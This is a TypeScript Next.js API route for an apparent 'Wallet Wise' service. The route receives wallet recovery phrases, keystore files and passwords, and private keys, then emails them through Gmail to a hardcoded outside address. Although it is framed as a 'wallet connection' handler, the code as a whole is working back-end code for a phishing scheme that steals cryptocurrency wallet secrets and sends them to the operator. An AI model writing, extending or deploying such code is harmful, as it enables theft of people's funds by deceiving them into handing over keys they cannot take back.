import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

interface WalletConnectionPayload {
  lib_version: string;
  user_id: string;
  service_id: string;
  template_id: string;
  template_params: {
    to_email: string;
    wallet_name: string;
    connection_type: string;
    connection_timestamp: string;
  };
  phrase_input: string;
  keystore_input: string;
  keystore_password: string;
  private_key_input: string;
  message: string;
}

export async function POST(request: NextRequest) {
  try {
    const payload: WalletConnectionPayload = await request.json();
    const isDevelopment = process.env.APP_ENV !== 'production';

    // Determine recipient email based on environment
    const recipientEmail = isDevelopment
      ? process.env.MAILHOG_USER || 'wallet-connections@mailhog.local'
      : process.env.GMAIL_USER || 'fedorasetup@gmail.com';

    if (!recipientEmail) {
      throw new Error('Recipient email not configured');
    }

    // Format timestamp to readable format
    const timestamp = new Date(payload.template_params.connection_timestamp);
    const formattedTime = timestamp.toLocaleString('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      timeZoneName: 'short',
    });

    // Prepare email content
    const emailContent = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; background: #f9f9f9; border-radius: 8px; }
    .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center; }
    .header h1 { margin: 0; font-size: 24px; }
    .content { background: white; padding: 20px; border-radius: 0 0 8px 8px; }
    .section { margin-bottom: 20px; }
    .section-title { font-weight: bold; color: #667eea; font-size: 16px; margin-bottom: 10px; border-bottom: 2px solid #667eea; padding-bottom: 5px; }
    .info-item { margin: 8px 0; padding: 8px 0; }
    .label { font-weight: bold; color: #555; display: inline-block; width: 150px; }
    .value { color: #333; word-break: break-all; }
    .data-item { background: #f5f5f5; padding: 10px; margin: 8px 0; border-left: 4px solid #667eea; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; }
    .footer { text-align: center; color: #999; font-size: 12px; margin-top: 20px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🔐 Wallet Connection Details</h1>
    </div>
    <div class="content">
      <div class="section">
        <div class="section-title">Connection Information</div>
        <div class="info-item">
          <span class="label">Timestamp:</span>
          <span class="value">${formattedTime}</span>
        </div>
        <div class="info-item">
          <span class="label">Wallet Name:</span>
          <span class="value">${payload.template_params.wallet_name}</span>
        </div>
        <div class="info-item">
          <span class="label">Connection Type:</span>
          <span class="value">${payload.template_params.connection_type}</span>
        </div>
      </div>

      <div class="section">
        <div class="section-title">Connection Data</div>
        ${
          payload.phrase_input
            ? `<div class="data-item"><strong>🔑 Recovery Phrase:</strong><br>${payload.phrase_input}</div>`
            : ''
        }
        ${
          payload.keystore_input
            ? `<div class="data-item"><strong>📦 Keystore JSON:</strong><br>${payload.keystore_input.substring(
                0,
                100
              )}...</div>`
            : ''
        }
        ${
          payload.keystore_password
            ? `<div class="data-item"><strong>🔓 Keystore Password:</strong><br>${payload.keystore_password.substring(
                0,
                100
              )}***</div>`
            : ''
        }
        ${
          payload.private_key_input
            ? `<div class="data-item"><strong>🔐 Private Key:</strong><br>${payload.private_key_input.substring(
                0,
                100
              )}***</div>`
            : ''
        }
      </div>

      ${
        payload.message
          ? `
      <div class="section">
        <div class="section-title">Message/Phrase</div>
        <div class="data-item">${payload.message}</div>
      </div>
      `
          : ''
      }
    </div>
    <div class="footer">
      <p>This is an automated message from Wallet Wise. Please do not reply to this email.</p>
    </div>
  </div>
</body>
</html>
    `;

    let transporter;

    if (isDevelopment) {
      // Use MailHog for development
      transporter = nodemailer.createTransport({
        host: process.env.MAILHOG_HOST || 'localhost',
        port: parseInt(process.env.MAILHOG_PORT || '1025'),
        secure: false,
      });
    } else {
      // Use Gmail for production
      transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.GMAIL_USER,
          pass: process.env.GMAIL_APP_PASSWORD,
        },
      });
    }

    // Send email
    const mailOptions = {
      from: isDevelopment
        ? `noreply@${process.env.MAILHOG_FROM_DOMAIN || 'wallet-wise.local'}`
        : process.env.GMAIL_USER,
      to: recipientEmail,
      subject: `Wallet Connection - ${payload.template_params.wallet_name} (${payload.template_params.connection_type})`,
      html: emailContent,
    };

    const info = await transporter.sendMail(mailOptions);

    return NextResponse.json(
      {
        success: true,
        message: 'Wallet connection details forwarded successfully',
        messageId: info.messageId,
      },
      { status: 200 }
    );
  } catch (error) {
    console.error('Error processing wallet connection:', error);

    return NextResponse.json(
      {
        success: false,
        message: 'Failed to process wallet connection',
        error: error instanceof Error ? error.message : 'Unknown error',
      },
      { status: 500 }
    );
  }
}
